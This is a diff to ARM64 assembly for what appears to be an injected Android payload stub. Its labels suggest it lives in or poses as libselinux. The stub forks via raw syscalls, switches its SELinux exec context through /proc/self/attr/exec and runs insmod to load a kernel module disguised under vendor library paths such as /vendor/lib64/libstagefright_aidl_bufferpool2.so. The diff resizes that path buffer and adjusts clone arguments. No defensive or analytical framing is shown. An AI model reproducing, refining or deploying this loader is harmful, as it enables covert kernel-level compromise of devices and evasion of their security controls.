@@ -11,6 +11,12 @@
 
 libselinux_data:
 
+ko_target_param:
+    .ascii "ko_target="
+    .global ko_target
+ko_target:
+    .skip 49, 0                             /* must hold longest candidate path (currently /vendor/lib64/libstagefright_aidl_bufferpool2.so (48 chars)) + null; increase if adding longer candidates */
+
 mutex_file:
     .asciz "/dev/df"
 selinux_ctx:
@@ -19,18 +25,8 @@ attr_exec:
     .asciz "/proc/self/attr/exec"
 exe_path:
     .asciz "/vendor/bin/insmod"
-ko_target_param:
-    .ascii "ko_target="
-    .global ko_target
-ko_target:
-    .ascii "/vendor/lib64/libbinderdebug.so\0"
-    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
-    .balign 4
-    .global libselinux_ko_target_off
-libselinux_ko_target_off:
-    .int ko_target - libselinux_data
 
-    .align 4
+    .balign 4
 
 libselinux_start:
     stp x0, x1, [sp, #-32]!
@@ -56,7 +52,6 @@ libselinux_start:
     // clone(SIGCHLD, 0, NULL, NULL, NULL)
     mov     x0, #SIGCHLD
     mov     x1, xzr
-    mov     x2, xzr
     mov     x8, SYS_clone
     svc     0
 
@@ -65,7 +60,7 @@ libselinux_start:
     // ── worker child ──────────────────────────────────────────────────────
 
     // Fork grandchild: set SELinux exec context → execve insmod
-    // x1=x2=xzr, x8=SYS_clone inherited from first clone
+    // x1=xzr, x8=SYS_clone inherited from first clone
     mov     x0, #SIGCHLD
     svc     0
     cbnz    w0, myexit
